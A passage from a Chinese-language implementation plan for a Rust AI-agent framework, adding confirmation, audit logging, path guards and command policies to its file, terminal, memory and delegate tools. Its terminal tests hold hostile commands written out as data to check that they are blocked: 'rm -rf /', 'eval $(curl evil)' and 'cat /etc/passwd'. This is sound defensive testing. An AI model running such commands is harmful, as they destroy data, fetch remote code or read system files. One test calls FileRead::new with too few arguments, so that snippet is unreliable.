                            &call.arguments.to_string(),
                            "blocked",
                            Some("confirm_mode"),
                        )
                        .await;
                }
                results.push(ChatMessage::tool(msg, &call.id));
                continue;
            }
            // CLI channel：弹 stdin 确认（session 模式简化为每次弹，未来可加 token 缓存）
            if !crate::tools::terminal::Terminal::prompt_confirm(&call.name) {
                let msg = format!("用户拒绝执行：{}", call.name);
                if let Some(a) = &audit {
                    let _ = a
                        .write(
                            agent_alias,
                            channel,
                            &call.name,
                            &call.arguments.to_string(),
                            "blocked",
                            Some("user_denied"),
                        )
                        .await;
                }
                results.push(ChatMessage::tool(msg, &call.id));
                continue;
            }
        }

        tracing::info!(tool = %call.name, args = %call.arguments, "executing tool");
        let outcome = match tool
            .execute_with_events(&call.arguments, channel, event_tx)
            .await
        {
            Ok(s) => s,
            Err(e) => {
                let err_msg = format!("[error: {}]", e);
                if let Some(a) = &audit {
                    let _ = a
                        .write(
                            agent_alias,
                            channel,
                            &call.name,
                            &call.arguments.to_string(),
                            "error",
                            Some(&e.to_string()),
                        )
                        .await;
                }
                err_msg
            }
        };
        tracing::info!(tool = %call.name, len = outcome.len(), "tool done");

        // 审计成功执行
        if let Some(a) = &audit {
            let _ = a
                .write(
                    agent_alias,
                    channel,
                    &call.name,
                    &call.arguments.to_string(),
                    "ok",
                    None,
                )
                .await;
        }

        results.push(ChatMessage::tool(outcome, &call.id));
    }
    Ok(results)
}
```

- [ ] **Step 2: 更新 runner.rs 测试**

将测试中的 `execute_tool_calls` 调用更新为新签名：

```rust
// test_execute_calls
let msgs = execute_tool_calls(&reg, &calls, "cli", "none", "main", None, None)
    .await
    .unwrap();

// test_unknown_tool
let msgs = execute_tool_calls(&reg, &calls, "cli", "none", "main", None, None)
    .await
    .unwrap();
```

更新 `test_qq_blocks_confirm_required_tool` 测试（语义变化：现在 confirm_mode 全局，不再 per-channel）：

```rust
/// 验证 confirm_mode=always + 非 CLI channel 下，requires_confirm=true 的工具被拒绝
#[tokio::test]
async fn test_non_cli_blocks_confirm_required_tool() {
    struct DangerousTool;
    #[async_trait]
    impl Tool for DangerousTool {
        fn name(&self) -> &str { "dangerous" }
        fn description(&self) -> &str { "dangerous" }
        fn parameters_schema(&self) -> Value { json!({"type":"object"}) }
        fn requires_confirm(&self) -> bool { true }
        async fn execute(&self, _args: &Value, _channel: &str) -> Result<String> {
            Ok("executed".into())
        }
    }

    let mut reg = ToolRegistry::new();
    reg.register(Arc::new(DangerousTool));
    let calls = vec![ToolCall {
        id: "1".into(),
        name: "dangerous".into(),
        arguments: json!({}),
    }];

    // qq + always：应被拒绝
    let msgs = execute_tool_calls(&reg, &calls, "qq", "always", "main", None, None)
        .await.unwrap();
    assert_eq!(msgs.len(), 1);
    assert!(msgs[0].content.as_text().contains("需在 CLI 确认"));

    // qq + none：应执行
    let msgs = execute_tool_calls(&reg, &calls, "qq", "none", "main", None, None)
        .await.unwrap();
    assert_eq!(msgs[0].content.as_text(), "executed");

    // cli + always：CLI 弹确认（测试环境 stdin 无输入，会被拒绝）
    // 注意：这个测试在 CI 中可能不稳定，改为测 none 模式
    let msgs = execute_tool_calls(&reg, &calls, "cli", "none", "main", None, None)
        .await.unwrap();
    assert_eq!(msgs[0].content.as_text(), "executed");
}
```

- [ ] **Step 3: 编译验证**

Run: `cargo build`
Expected: 编译通过（agent/mod.rs 的调用在 Task 4 已更新签名）

如果 `agent/mod.rs` 中 `execute_tool_calls` 调用参数不匹配，回到 Task 4 Step 3 确认调用已更新为：

```rust
execute_tool_calls(
    &self.tools,
    &calls,
    channel,
    &self.confirm_mode,
    &self.alias,
    self.audit.clone(),
    Some(&event_tx),
).await?
```

- [ ] **Step 4: 测试验证**

Run: `cargo test runner`
Expected: 通过

- [ ] **Step 5: 提交**

```bash
git add src/agent/runner.rs
git commit -m "refactor(runner): global confirm_mode + audit logging + new execute_tool_calls signature"
```

---

## Task 6: file 工具改造

**Files:**
- Modify: `src/tools/file.rs`

- [ ] **Step 1: FileRead/FileWrite/FileEdit 加 is_main 字段 + 用 path_guard**

将 `src/tools/file.rs` 整体替换为：

```rust
use crate::path_guard;
use crate::tools::Tool;
use anyhow::{anyhow, Result};
use async_trait::async_trait;
use serde_json::Value;
use std::path::{Path, PathBuf};

pub struct FileRead {
    workspace: PathBuf,
    is_main: bool,
}
pub struct FileWrite {
    workspace: PathBuf,
    is_main: bool,
}
pub struct FileEdit {
    workspace: PathBuf,
    is_main: bool,
}

impl FileRead {
    pub fn new(workspace: PathBuf, is_main: bool) -> Self {
        Self { workspace, is_main }
    }
}
impl FileWrite {
    pub fn new(workspace: PathBuf, is_main: bool) -> Self {
        Self { workspace, is_main }
    }
}
impl FileEdit {
    pub fn new(workspace: PathBuf, is_main: bool) -> Self {
        Self { workspace, is_main }
    }
}

/// 保留旧函数签名供 cli.rs 的 @path 图片解析复用
pub(crate) fn resolve_within(workspace: &Path, p: &str) -> Result<PathBuf> {
    path_guard::validate_path(workspace, p, None)
}

/// 主 agent 可读 subagent/ 子目录的额外路径
fn extra_readable_for_main(workspace: &Path) -> Option<PathBuf> {
    Some(workspace.join("subagent"))
}

#[async_trait]
impl Tool for FileRead {
    fn name(&self) -> &str { "file_read" }
    fn description(&self) -> &str {
        "Read the content of a file at the given path. Relative paths resolve to the agent workspace."
    }
    fn parameters_schema(&self) -> Value {
        serde_json::json!({
            "type": "object",
            "properties": {
                "path": { "type": "string", "description": "Absolute or relative file path (relative to agent workspace)" }
            },
            "required": ["path"]
        })
    }
    async fn execute(&self, args: &Value, _channel: &str) -> Result<String> {
        let path = args.get("path").and_then(|v| v.as_str())
            .ok_or_else(|| anyhow!("missing 'path' argument"))?;
        let extra = if self.is_main { extra_readable_for_main(&self.workspace) } else { None };
        let resolved = path_guard::validate_path(&self.workspace, path, extra.as_deref())?;
        let content = tokio::fs::read_to_string(&resolved)
            .await
            .map_err(|e| anyhow!("read {:?}: {}", resolved, e))?;
        Ok(content)
    }
}

#[async_trait]
impl Tool for FileWrite {
    fn name(&self) -> &str { "file_write" }
    fn description(&self) -> &str {
        "Write content to a file (overwrites). Relative paths resolve to the agent workspace."
    }
    fn parameters_schema(&self) -> Value {
        serde_json::json!({
            "type": "object",
            "properties": {
                "path": { "type": "string", "description": "Absolute or relative file path (relative to agent workspace)" },
                "content": { "type": "string" }
            },
            "required": ["path", "content"]
        })
    }
    fn requires_confirm(&self) -> bool { false }
    async fn execute(&self, args: &Value, _channel: &str) -> Result<String> {
        let path = args.get("path").and_then(|v| v.as_str())
            .ok_or_else(|| anyhow!("missing 'path'"))?;
        let content = args.get("content").and_then(|v| v.as_str())
            .ok_or_else(|| anyhow!("missing 'content'"))?;

        // 主 agent 写 subagent/ 路径时拒绝（.inbox/ 例外由 delegate 系统层处理，不经 file 工具）
        let resolved = path_guard::validate_path(&self.workspace, path, None)?;
        if self.is_main {
            let subagent_dir = self.workspace.join("subagent");
            let normalized = path_guard::validate_path(&self.workspace, path, None)?;
            if normalized.starts_with(&subagent_dir) {
                anyhow::bail!("主 agent 不可写子 agent 工作区: {}", path);
            }
        }

        if let Some(parent) = resolved.parent() {
            tokio::fs::create_dir_all(parent).await.ok();
        }
        tokio::fs::write(&resolved, content)
            .await
            .map_err(|e| anyhow!("write {:?}: {}", resolved, e))?;
        Ok(format!("wrote {} bytes to {}", content.len(), resolved.display()))
    }
}

#[async_trait]
impl Tool for FileEdit {
    fn name(&self) -> &str { "file_edit" }
    fn description(&self) -> &str {
        "Replace old_string with new_string in a file. Relative paths resolve to the agent workspace."
    }
    fn parameters_schema(&self) -> Value {
        serde_json::json!({
            "type": "object",
            "properties": {
                "path": { "type": "string", "description": "Absolute or relative file path (relative to agent workspace)" },
                "old_string": { "type": "string" },
                "new_string": { "type": "string" }
            },
            "required": ["path", "old_string", "new_string"]
        })
    }
    fn requires_confirm(&self) -> bool { false }
    async fn execute(&self, args: &Value, _channel: &str) -> Result<String> {
        let path = args.get("path").and_then(|v| v.as_str())
            .ok_or_else(|| anyhow!("missing 'path'"))?;
        let old = args.get("old_string").and_then(|v| v.as_str())
            .ok_or_else(|| anyhow!("missing 'old_string'"))?;
        let new = args.get("new_string").and_then(|v| v.as_str())
            .ok_or_else(|| anyhow!("missing 'new_string'"))?;

        let resolved = path_guard::validate_path(&self.workspace, path, None)?;
        if self.is_main {
            let subagent_dir = self.workspace.join("subagent");
            if resolved.starts_with(&subagent_dir) {
                anyhow::bail!("主 agent 不可写子 agent 工作区: {}", path);
            }
        }

        let content = tokio::fs::read_to_string(&resolved)
            .await
            .map_err(|e| anyhow!("read {:?}: {}", resolved, e))?;
        let new_content = if old.is_empty() {
            new.to_string()
        } else {
            let count = content.matches(old).count();
            if count == 0 {
                return Err(anyhow!("old_string not found in {}", resolved.display()));
            }
            if count > 1 {
                return Err(anyhow!(
                    "old_string appears {} times in {}, need unique match",
                    count, resolved.display()
                ));
            }
            content.replacen(old, new, 1)
        };
        tokio::fs::write(&resolved, &new_content)
            .await
            .map_err(|e| anyhow!("write {:?}: {}", resolved, e))?;
        Ok(format!("edited {}", resolved.display()))
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;
    use tempfile::tempdir;

    #[tokio::test]
    async fn test_file_read_write() {
        let ws = tempdir().unwrap();
        let ws_path = ws.path().to_path_buf();
        std::fs::write(ws_path.join("test.txt"), "hello world").unwrap();
        let tool = FileRead::new(ws_path, true);
        let result = tool.execute(&json!({"path": "test.txt"}), "cli").await.unwrap();
        assert!(result.contains("hello world"));
    }

    #[tokio::test]
    async fn test_workspace_boundary_blocks_parent_traversal() {
        let ws = tempdir().unwrap();
        let ws_path = ws.path().to_path_buf();
        let write_tool = FileWrite::new(ws_path.clone(), true);
        write_tool.execute(&json!({"path": "inside.txt", "content": "ok"}), "cli").await.unwrap();

        let read_tool = FileRead::new(ws_path);
        let escaped = read_tool.execute(&json!({"path": "../outside.txt"}), "cli").await;
        assert!(escaped.is_err());
    }

    #[tokio::test]
    async fn test_main_agent_can_read_subagent() {
        let ws = tempdir().unwrap();
        let ws_path = ws.path().to_path_buf();
        let subagent_dir = ws_path.join("subagent").join("coder");
        std::fs::create_dir_all(&subagent_dir).unwrap();
        std::fs::write(subagent_dir.join("result.md"), "sub output").unwrap();

        let tool = FileRead::new(ws_path, true);
        let result = tool.execute(&json!({"path": "subagent/coder/result.md"}), "cli").await;
        assert!(result.is_ok());
        assert!(result.unwrap().contains("sub output"));
    }

    #[tokio::test]
    async fn test_main_agent_cannot_write_subagent() {
        let ws = tempdir().unwrap();
        let ws_path = ws.path().to_path_buf();
        std::fs::create_dir_all(ws_path.join("subagent").join("coder")).unwrap();

        let tool = FileWrite::new(ws_path, true);
        let result = tool
            .execute(&json!({"path": "subagent/coder/evil.txt", "content": "hack"}), "cli")
            .await;
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("不可写子 agent"));
    }

    #[tokio::test]
    async fn test_sub_agent_cannot_read_subagent_sibling() {
        let ws = tempdir().unwrap();
        // 子 agent workspace 是 subagent/coder/
        let coder_ws = ws.path().join("subagent").join("coder");
        std::fs::create_dir_all(&coder_ws).unwrap();
        // 兄弟子 agent searcher 的文件
        let searcher_ws = ws.path().join("subagent").join("searcher");
        std::fs::create_dir_all(&searcher_ws).unwrap();
        std::fs::write(searcher_ws.join("secret.txt"), "secret").unwrap();

        let tool = FileRead::new(coder_ws, false);
        let result = tool
            .execute(&json!({"path": "../searcher/secret.txt"}), "cli")
            .await;
        assert!(result.is_err());
    }
}
```

- [ ] **Step 2: 编译 + 测试**

Run: `cargo test file`
Expected: 通过

- [ ] **Step 3: 提交**

```bash
git add src/tools/file.rs
git commit -m "refactor(file): use path_guard + main agent can read subagent/ but cannot write"
```

---

## Task 7: terminal 工具改造

**Files:**
- Modify: `src/tools/terminal.rs`

- [ ] **Step 1: Terminal 改用 command_policy + 三层防御**

将 `src/tools/terminal.rs` 整体替换为：

```rust
use crate::path_guard;
use crate::tools::Tool;
use anyhow::{anyhow, Result};
use async_trait::async_trait;
use serde_json::Value;
use std::path::PathBuf;

pub struct Terminal {
    pub command_policy: String,
    pub command_whitelist: Vec<String>,
    pub workspace: PathBuf,
}

impl Terminal {
    pub fn new(
        command_policy: String,
        command_whitelist: Vec<String>,
        workspace: PathBuf,
    ) -> Self {
        Self {
            command_policy,
            command_whitelist,
            workspace,
        }
    }

    /// CLI 确认提示（静态方法，供 runner.rs 调用）
    pub fn prompt_confirm(command: &str) -> bool {
        use std::io::{self, BufRead, Write};
        print!("[confirm] run `{}`? (y/N): ", command);
        io::stdout().flush().ok();
        let mut line = String::new();
        if io::stdin().lock().read_line(&mut line).is_err() {
            return false;
        }
        line.trim().eq_ignore_ascii_case("y")
    }

    /// 命令策略校验
    fn check_command_policy(&self, command: &str) -> Result<()> {
        match self.command_policy.as_str() {
            "none" => Ok(()),
            "blacklist" => {
                if path_guard::hits_command_blacklist(command) {
                    anyhow::bail!("命令命中黑名单: {}", command);
                }
                Ok(())
            }
            "whitelist" => {
                let first = command.split_whitespace().next().unwrap_or("");
                if !self.command_whitelist.iter().any(|w| w == first) {
                    anyhow::bail!("命令 {} 不在白名单内", first);
                }
                Ok(())
            }
            _ => Ok(()),
        }
    }

    /// 三层路径防御
    fn check_path_safety(&self, command: &str) -> Result<()> {
        // 第一层：shell 包装拒绝
        path_guard::check_shell_wrappers(command)?;

        // 第二层 + 第三层：路径白名单 + 黑名单兜底
        path_guard::validate_command_paths(command, &self.workspace)?;

        Ok(())
    }
}

#[async_trait]
impl Tool for Terminal {
    fn name(&self) -> &str { "terminal" }
    fn description(&self) -> &str {
        "Execute a shell command in the agent workspace. Returns combined stdout+stderr."
    }
    fn parameters_schema(&self) -> Value {
        serde_json::json!({
            "type": "object",
            "properties": {
                "command": { "type": "string", "description": "Shell command to execute (runs in agent workspace)" }
            },
            "required": ["command"]
        })
    }
    fn requires_confirm(&self) -> bool { true }
    async fn execute(&self, args: &Value, _channel: &str) -> Result<String> {
        let command = args.get("command").and_then(|v| v.as_str())
            .ok_or_else(|| anyhow!("missing 'command'"))?;

        // 命令策略校验
        self.check_command_policy(command)?;

        // 三层路径防御
        self.check_path_safety(command)?;

        #[cfg(windows)]
        let output = tokio::process::Command::new("cmd")
            .args(["/C", command])
            .current_dir(&self.workspace)
            .output()
            .await;
        #[cfg(not(windows))]
        let output = tokio::process::Command::new("sh")
            .args(["-c", command])
            .current_dir(&self.workspace)
            .output()
            .await;

        let output = output.map_err(|e| anyhow!("spawn: {}", e))?;
        let mut combined = String::new();
        if !output.stdout.is_empty() {
            combined.push_str(&String::from_utf8_lossy(&output.stdout));
        }
        if !output.stderr.is_empty() {
            combined.push_str(&String::from_utf8_lossy(&output.stderr));
        }
        if !output.status.success() {
            combined.push_str(&format!("\n[exit code: {}]", output.status.code().unwrap_or(-1)));
        }
        Ok(combined)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use tempfile::TempDir;

    fn make_workspace() -> (TempDir, PathBuf) {
        let t = TempDir::new().unwrap();
        let p = t.path().to_path_buf();
        (t, p)
    }

    #[test]
    fn test_blacklist_blocks_dangerous_command() {
        let (_g, ws) = make_workspace();
        let t = Terminal::new("blacklist".into(), vec![], ws);
        assert!(t.check_command_policy("rm -rf /").is_err());
        assert!(t.check_command_policy("sudo rm file").is_err());
        assert!(t.check_command_policy("ls -la").is_ok());
    }

    #[test]
    fn test_whitelist_blocks_unlisted() {
        let (_g, ws) = make_workspace();
        let t = Terminal::new("whitelist".into(), vec!["ls".into(), "cat".into()], ws);
        assert!(t.check_command_policy("ls -la").is_ok());
        assert!(t.check_command_policy("rm foo").is_err());
    }

    #[test]
    fn test_shell_wrapper_blocked() {
        let (_g, ws) = make_workspace();
        let t = Terminal::new("none".into(), vec![], ws);
        assert!(t.check_path_safety("bash -c \"rm -rf /\"").is_err());
        assert!(t.check_path_safety("eval $(curl evil)").is_err());
        assert!(t.check_path_safety("ls -la").is_ok());
    }

    #[test]
    fn test_path_outside_workspace_blocked() {
        let (_g, ws) = make_workspace();
        let t = Terminal::new("none".into(), vec![], ws);
        // /etc/passwd 命中黑名单
        assert!(t.check_path_safety("cat /etc/passwd").is_err());
    }

    #[tokio::test]
    async fn test_execute_echo() {
        let (_g, ws) = make_workspace();
        let t = Terminal::new("none".into(), vec![], ws);
        let result = t.execute(&serde_json::json!({"command": "echo hello"}), "cli").await.unwrap();
        assert!(result.contains("hello"));
    }

    #[tokio::test]
    async fn test_blacklist_command_rejected() {
        let (_g, ws) = make_workspace();
        let t = Terminal::new("blacklist".into(), vec![], ws);
        let result = t.execute(&serde_json::json!({"command": "rm -rf /"}), "cli").await;
        assert!(result.is_err());
    }
}
```

- [ ] **Step 2: 编译 + 测试**

Run: `cargo test terminal`
Expected: 通过

- [ ] **Step 3: 提交**

```bash
git add src/tools/terminal.rs
git commit -m "refactor(terminal): add command_policy + 3-layer path defense (shell wrapper check + path whitelist + blacklist)"
```

---

## Task 8: memory 工具改造

**Files:**
- Modify: `src/tools/memory.rs`

- [ ] **Step 1: MemoryWrite 加 is_main 字段 + 子 agent 拒写 USER.md**

将 `src/tools/memory.rs` 整体替换为：

```rust
use crate::tools::Tool;
use anyhow::{anyhow, Result};
use async_trait::async_trait;
use serde_json::Value;
use std::path::PathBuf;
use std::sync::Arc;
use tokio::sync::Mutex;

pub struct MemoryWrite {
    pub memory_path: PathBuf,
    /// USER.md 路径（子 agent 拒绝写此文件）
    pub user_path: PathBuf,
    pub is_main: bool,
    pub lock: Arc<Mutex<()>>,
}

impl MemoryWrite {
    pub fn new(memory_path: PathBuf, user_path: PathBuf, is_main: bool) -> Self {
        Self {
            memory_path,
            user_path,
            is_main,
            lock: Arc::new(Mutex::new(())),
        }
    }
}

#[async_trait]
impl Tool for MemoryWrite {
    fn name(&self) -> &str { "memory_write" }
    fn description(&self) -> &str {
        "Write a short factual entry to long-term memory. Use for things the user said to remember."
    }
    fn parameters_schema(&self) -> Value {
        serde_json::json!({
            "type": "object",
            "properties": {
                "entry": { "type": "string", "description": "Short factual entry to remember" }
            },
            "required": ["entry"]
        })
    }
    fn requires_confirm(&self) -> bool { true }
    async fn execute(&self, args: &Value, _channel: &str) -> Result<String> {
        let entry = args.get("entry").and_then(|v| v.as_str())
            .ok_or_else(|| anyhow!("missing 'entry'"))?;

        // 子 agent 不允许写 USER.md（身份绑定统一在主 agent 管理）
        // memory_write 本身写 MEMORY.md，但检查 is_main 防止子 agent 误用
        if !self.is_main {
            anyhow::bail!("子 agent 不可写长期记忆，身份绑定统一在主 agent 管理");
        }

        let _g = self.lock.lock().await;
        let today = chrono::Local::now().format("%Y-%m-%d").to_string();
        let line = format!("- [{}] {}\n", today, entry);

        let mut content = tokio::fs::read_to_string(&self.memory_path)
            .await
            .unwrap_or_default();
        content.push_str(&line);
        tokio::fs::write(&self.memory_path, &content)
            .await
            .map_err(|e| anyhow!("write memory: {}", e))?;
        Ok(format!("remembered: {}", entry))
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use tempfile::tempdir;

    #[tokio::test]
    async fn test_main_agent_can_write_memory() {
        let dir = tempdir().unwrap();
        let mem_path = dir.path().join("MEMORY.md");
        let user_path = dir.path().join("USER.md");
        let tool = MemoryWrite::new(mem_path.clone(), user_path, true);
        tool.execute(&serde_json::json!({"entry": "user likes rust"}), "cli").await.unwrap();

        let content = tokio::fs::read_to_string(&mem_path).await.unwrap();
        assert!(content.contains("user likes rust"));
    }

    #[tokio::test]
    async fn test_sub_agent_cannot_write_memory() {
        let dir = tempdir().unwrap();
        let mem_path = dir.path().join("MEMORY.md");
        let user_path = dir.path().join("USER.md");
        let tool = MemoryWrite::new(mem_path.clone(), user_path, false);
        let result = tool.execute(&serde_json::json!({"entry": "test"}), "cli").await;
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("子 agent"));
    }
}
```

- [ ] **Step 2: 编译 + 测试**

Run: `cargo test memory`
Expected: 通过

- [ ] **Step 3: 提交**

```bash
git add src/tools/memory.rs
git commit -m "refactor(memory): sub agent cannot write MEMORY.md (identity managed by main agent)"
```

---

## Task 9: delegate 工具改造

**Files:**
- Modify: `src/tools/delegate.rs`

- [ ] **Step 1: 加 file_paths 参数 + .inbox 复制 + {text, output_files} 返回值**

将 `src/tools/delegate.rs` 的 `DelegateTool::execute_with_events` 方法替换为：

```rust
async fn execute_with_events(
    &self,
    args: &Value,
    _channel: &str,
    event_tx: Option<&mpsc::Sender<TurnEvent>>,
) -> Result<String> {
    let registry = match self.get_registry() {
        Some(r) => r.clone(),
        None => return Ok("[委派失败: registry 未初始化]".into()),
    };

    let agent_name = args["agent_name"]
        .as_str()
        .ok_or_else(|| anyhow::anyhow!("missing agent_name"))?;
    let task = args["task"]
        .as_str()
        .ok_or_else(|| anyhow::anyhow!("missing task"))?;
    let file_paths: Vec<String> = args["file_paths"]
        .as_array()
        .map(|arr| arr.iter().filter_map(|v| v.as_str().map(String::from)).collect())
        .unwrap_or_default();

    let sub_agent = match registry.get(agent_name) {
        Ok(a) => a.clone(),
        Err(e) => return Ok(format!("[委派失败: {}]", e)),
    };

    // 获取主 agent 和子 agent 的 workspace
    let (main_workspace, sub_workspace) = {
        let main_a = registry.main.lock().await;
        let sub_a = sub_agent.lock().await;
        (main_a.workspace.clone(), sub_a.workspace.clone())
    };

    // .inbox 机制：清空后复制主 agent 指定文件到子 agent .inbox/
    let inbox_dir = sub_workspace.join(".inbox");
    if !file_paths.is_empty() {
        // 清空 .inbox
        if inbox_dir.exists() {
            tokio::fs::remove_dir_all(&inbox_dir).await.ok();
        }
        tokio::fs::create_dir_all(&inbox_dir).await?;

        // 复制文件
        for fp in &file_paths {
            let src = match crate::path_guard::validate_path(&main_workspace, fp, None) {
                Ok(p) => p,
                Err(e) => {
                    tracing::warn!(file = %fp, error = %e, "skip file outside workspace");
                    continue;
                }
            };
            if !src.exists() {
                tracing::warn!(file = %fp, "source file not exist, skip");
                continue;
            }
            let filename = src.file_name().unwrap_or_default();
            let dst = inbox_dir.join(filename);
            tokio::fs::copy(&src, &dst).await?;
            tracing::info!(file = %fp, dst = %dst.display(), "copied to subagent .inbox");
        }
    }

    // task 文本追加 .inbox 提示
    let full_task = if file_paths.is_empty() {
        task.to_string()
    } else {
        format!("{}\n\n[输入文件已放在 .inbox/: {}]", task, file_paths.join(", "))
    };

    let (tx, mut rx) = mpsc::channel::<TurnEvent>(64);
    let task_clone = full_task.clone();
    let timeout = self.timeout_secs;

    let result = tokio::time::timeout(Duration::from_secs(timeout), async {
        sub_agent
            .lock()
            .await
            .handle_input_streaming(&task_clone, "delegate", tx)
            .await
    })
    .await;

    // 收集子 Agent 的事件：Chunk 转发给主 channel，同时累积输出
    let mut output = String::new();
    while let Ok(ev) = rx.try_recv() {
        if let TurnEvent::Chunk { delta } = ev {
            output.push_str(&delta);
            if let Some(tx) = event_tx {
                let _ = tx.send(TurnEvent::Chunk { delta }).await;
            }
        }
    }

    // 从子 agent 本次 turn 的工具调用记录提取产出文件清单
    let output_files: Vec<String> = {
        let sub_a = sub_agent.lock().await;
        sub_a
            .turn_tool_calls
            .iter()
            .filter(|tc| tc.name == "file_write" || tc.name == "file_edit")
            .filter_map(|tc| tc.args.get("path").and_then(|v| v.as_str()).map(String::from))
            .collect::<std::collections::HashSet<_>>()
            .into_iter()
            .collect()
    };

    let return_value = match result {
        Ok(Ok(_)) => {
            if output.is_empty() && output_files.is_empty() {
                "[子 Agent 无输出]".to_string()
            } else {
                serde_json::json!({
                    "text": output,
                    "output_files": output_files,
                })
                .to_string()
            }
        }
        Ok(Err(e)) => serde_json::json!({
            "text": format!("[子 Agent 执行错误: {}]", e),
            "output_files": output_files,
        }).to_string(),
        Err(_) => serde_json::json!({
            "text": format!("[子 Agent 超时({}秒)]", timeout),
            "output_files": output_files,
        }).to_string(),
    };

    Ok(return_value)
}
```

- [ ] **Step 2: 更新 parameters_schema 加 file_paths**

```rust
fn parameters_schema(&self) -> Value {
    let agents: Vec<String> = self
        .get_registry()
        .map(|r| r.available_sub_agents())
        .unwrap_or_default();
    json!({
        "type": "object",
        "properties": {
            "agent_name": {
                "type": "string",
                "description": "要委派的子 Agent 名称",
                "enum": agents
            },
            "task": {
                "type": "string",
                "description": "要委派给子 Agent 执行的任务描述"
            },
            "file_paths": {
                "type": "array",
                "items": { "type": "string" },
                "description": "要传递给子 Agent 的文件路径列表（主 agent workspace 内的相对路径），系统会复制到子 agent .inbox/"
            }
        },
        "required": ["agent_name", "task"]
    })
}
```

- [ ] **Step 3: 更新测试中的子 agent workspace 路径**

在 `make_registry_with_sub` 等测试辅助函数中，子 agent 的 workspace 要用独立路径（不再是 `/tmp/llaia-test`）：

```rust
async fn make_registry_with_sub(sub_alias: &str) -> Arc<AgentRegistry> {
    let store = SessionStore::open_in_memory().unwrap();
    let sid = store.create_session("sub", "test").unwrap();
    let config = Config::default_for_workspace("/tmp/llaia-test");
    let agent = Agent::new(
        &config,
        Arc::new(HangingProvider),
        Arc::new(ToolRegistry::new()),
        Arc::new(store),
        sid,
        "sub soul".into(),
        8192,
        std::path::PathBuf::from("/tmp/llaia-test/workspace/subagent/coder"),
        std::path::PathBuf::from("/tmp/llaia-test"),
        false,
        sub_alias.into(),
        None,
    ).await;
    let mut registry = AgentRegistry::new(Arc::new(Mutex::new(agent)));
    let dummy = registry.main.clone();
    registry.register_sub_agent(sub_alias.into(), dummy);
    Arc::new(registry)
}
```

- [ ] **Step 4: 编译 + 测试**

Run: `cargo test delegate`
Expected: 通过

- [ ] **Step 5: 提交**

```bash
git add src/tools/delegate.rs
git commit -m "feat(delegate): add file_paths param + .inbox copy + {text, output_files} return value"
```

---

## Task 10: migrate.rs 目录迁移

**Files:**
- Create: `src/migrate.rs`
- Modify: `src/lib.rs`

- [ ] **Step 1: 创建 src/migrate.rs**

```rust
use anyhow::Result;
use std::path::Path;

/// 检测并执行 v0.1 → v0.2 目录结构迁移
///
/// 旧结构：~/.llaia/ 下直接放 SOUL.md / USER.md / MEMORY.md / sessions.db / uploads/
/// 新结构：这些文件移到 ~/.llaia/workspace/ 下
///
/// 返回 true 表示执行了迁移，false 表示无需迁移
pub fn migrate_if_needed(config_dir: &Path) -> Result<bool> {
    let marker = config_dir.join(".migrated_v0.2");
    if marker.exists() {
        return Ok(false);
    }

    let workspace = config_dir.join("workspace");
    let old_soul = config_dir.join("SOUL.md");
    let old_user = config_dir.join("USER.md");
    let old_memory = config_dir.join("MEMORY.md");
    let old_sessions = config_dir.join("sessions.db");
    let old_uploads = config_dir.join("uploads");
    let old_subagents = config_dir.join("subagents");

    // 检测是否有旧结构文件
    let has_old = old_soul.exists()
        || old_user.exists()
        || old_memory.exists()
        || old_sessions.exists()
        || old_uploads.exists()
        || old_subagents.exists();

    if !has_old {
        // 无旧文件，直接写标记
        std::fs::write(&marker, "")?;
        return Ok(false);
    }

    tracing::info!("detected old directory structure, migrating to v0.2 workspace layout");

    // 创建 workspace/
    std::fs::create_dir_all(&workspace)?;

    // 移动文件
    move_if_exists(&old_soul, &workspace.join("SOUL.md"))?;
    move_if_exists(&old_user, &workspace.join("USER.md"))?;
    move_if_exists(&old_memory, &workspace.join("MEMORY.md"))?;
    move_if_exists(&old_sessions, &workspace.join("sessions.db"))?;
    move_dir_if_exists(&old_uploads, &workspace.join("uploads"))?;

    // 移动旧子 agent 目录：~/.llaia/subagents/<name>/ → ~/.llaia/workspace/subagent/<name>/
    if old_subagents.exists() {
        let new_subagent = workspace.join("subagent");
        std::fs::create_dir_all(&new_subagent)?;
        for entry in std::fs::read_dir(&old_subagents)? {
            let entry = entry?;
            if entry.file_type()?.is_dir() {
                let name = entry.file_name();
                let src = entry.path();
                let dst = new_subagent.join(&name);
                if !dst.exists() {
                    std::fs::rename(&src, &dst)?;
                    tracing::info!(agent = ?name, "migrated subagent directory");
                }
            }
        }
        // 移动完后删除空 subagents 目录
        std::fs::remove_dir(&old_subagents).ok();
    }

    // 备份 config.toml
    let config_path = config_dir.join("config.toml");
    if config_path.exists() {
        let bak = config_dir.join("config.toml.bak");
        std::fs::copy(&config_path, &bak)?;
        tracing::info!("backed up config.toml to config.toml.bak");
    }

    // 写迁移标记
    std::fs::write(&marker, "")?;
    tracing::info!("migration to v0.2 complete");
    Ok(true)
}

fn move_if_exists(src: &Path, dst: &Path) -> Result<()> {
    if src.exists() {
        if let Some(parent) = dst.parent() {
            std::fs::create_dir_all(parent)?;
        }
        std::fs::rename(src, dst)?;
        tracing::info!(file = ?src.file_name(), "migrated file");
    }
    Ok(())
}

fn move_dir_if_exists(src: &Path, dst: &Path) -> Result<()> {
    if src.exists() && src.is_dir() {
        if dst.exists() {
            // dst 已存在：合并目录（移动子项）
            for entry in std::fs::read_dir(src)? {
                let entry = entry?;
                let name = entry.file_name();
                let src_item = entry.path();
                let dst_item = dst.join(&name);
                if !dst_item.exists() {
                    std::fs::rename(&src_item, &dst_item)?;
                }
            }
            std::fs::remove_dir(src).ok();
        } else {
            std::fs::rename(src, dst)?;
        }
        tracing::info!(dir = ?src.file_name(), "migrated directory");
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use tempfile::tempdir;

    #[test]
    fn test_no_migration_needed() {
        let dir = tempdir().unwrap();
        // 空 config_dir，无旧文件
        let migrated = migrate_if_needed(dir.path()).unwrap();
        assert!(!migrated);
        // 标记文件存在
        assert!(dir.path().join(".migrated_v0.2").exists());
    }

    #[test]
    fn test_already_migrated() {
        let dir = tempdir().unwrap();
        std::fs::write(dir.path().join(".migrated_v0.2"), "").unwrap();
        let migrated = migrate_if_needed(dir.path()).unwrap();
        assert!(!migrated);
    }

    #[test]
    fn test_migrate_old_structure() {
        let dir = tempdir().unwrap();
        // 模拟旧结构
